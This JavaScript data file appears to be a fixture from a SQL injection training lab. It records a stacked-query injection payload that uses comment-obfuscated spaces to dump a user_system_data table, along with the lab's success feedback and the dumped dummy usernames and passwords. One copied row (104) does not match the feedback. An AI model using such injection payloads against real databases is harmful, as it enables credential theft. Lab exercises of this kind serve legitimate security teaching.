// Feedback: You have succeeded: <p>USERID, USER_NAME, PASSWORD, COOKIE, <br \/>101, jsnow, passwd1, , <br \/>102, jdoe, passwd2, , <br \/>103, jplane, passwd3, , <br \/>104, jeff, jeff, , <br \/>105, dave, passW0rD, , <br \/><\/p>Well done! Can you also figure out a solution, by using a UNION?
// Output:  Your query was: SELECT * FROM user_data WHERE last_name = 'cyber';\/**\/select\/**\/*\/**\/from\/**\/user_system_data;--'

export const data = {
  table: [
    {
      USERID: "101",
      USER_NAME: "jsnow",
      PASSWORD: "passwd1",
      COOKIE: "",
    },

    {
      USERID: "102",
      USER_NAME: "jdoe",
      PASSWORD: "passwd2",
      COOKIE: "",
    },
    {
      USERID: "103",
      USER_NAME: "jplane",
      PASSWORD: "passwd3",
      COOKIE: "",
    },

    {
      USERID: "104",
      USER_NAME: "jdoe",
      PASSWORD: "passwd2",
      COOKIE: "",
    },
    {
      USERID: "105",
      USER_NAME: "dave",
      PASSWORD: "passW0rD",
      COOKIE: "",
    },
  ],
  string1: "Well done! Can you also figure out a solution, by using a UNION?",
  string2:
    "Output:  Your query was: SELECT * FROM user_data WHERE last_name = 'cyber';/**/select/**/*/**/from/**/user_system_data;--'",
};

